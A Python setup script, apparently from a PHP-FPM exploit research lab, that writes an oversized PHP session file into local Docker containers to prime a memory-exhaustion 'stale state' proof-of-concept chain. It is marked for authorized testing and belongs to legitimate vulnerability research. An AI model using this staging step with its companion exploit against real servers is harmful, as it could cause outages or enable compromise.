#!/usr/bin/env python3
"""Create the ~30MB session file required by verify_fpm_stale_state.py (Chain E).

setup.sh does not create it. The file must be owned by www-data (600)
and is truncated to 0 bytes after the producer OOM, so recreate before each run.

Usage:
  python3 poc/make_huge_session.py --target http://127.0.0.1:18080
  python3 poc/make_huge_session.py --target http://127.0.0.1:18080 --sid hugesession000000000000000 --size-mb 30

Then run:
  python3 poc/verify_fpm_stale_state.py --target http://127.0.0.1:18080

For authorized security testing only.
"""
import argparse
import subprocess
import sys


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--sid", default="hugesession000000000000000")
    ap.add_argument("--size-mb", type=int, default=30)
    ap.add_argument("--container", default="",
                    help="FPM container name (auto-detected from target port if empty)")
    args = ap.parse_args()

    # Map lab ports to FPM containers (see lab/docker-compose.yml + lab/README.md)
    port_to_container = {
        "18056": "php2shell-fpm-56",
        "18074": "php2shell-fpm-74",
        "18080": "php2shell-fpm-80",
        "18081": "php2shell-fpm-81",
        "18082": "php2shell-fpm-82",
        "18083": "php2shell-fpm-83",
        "18084": "php2shell-fpm-84",
        "18085": "php2shell-fpm-82p",
    }
    container = args.container
    if not container:
        port = args.target.rsplit(":", 1)[-1].rstrip("/")
        container = port_to_container.get(port, "php2shell-fpm-80")

    size = args.size_mb * 1024 * 1024
    # Valid php-handler payload: varname|s:<len>:"AAA...";
    # NOTE: type must be s: (string), not x:.
    header = f"huge_test|s:{size}:\"".encode()
    trailer = b"\";"
    chunk = b"A" * (1024 * 1024)

    print(f"[*] Writing {args.size_mb}MB session sess_{args.sid} into {container}...")
    p = subprocess.Popen(
        ["docker", "exec", "-i", container, "sh", "-c",
         f"cat > /tmp/sessions/sess_{args.sid} && chown www-data:www-data "
         f"/tmp/sessions/sess_{args.sid} && chmod 600 /tmp/sessions/sess_{args.sid} && "
         f"ls -l /tmp/sessions/sess_{args.sid}"],
        stdin=subprocess.PIPE)
    p.stdin.write(header)
    for _ in range(args.size_mb):
        p.stdin.write(chunk)
    p.stdin.write(trailer)
    p.stdin.close()
    rc = p.wait()
    if rc != 0:
        print("[-] docker exec failed", file=sys.stderr)
        return 1
    print("[+] Done. File is one-shot: it is truncated after the producer OOM.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
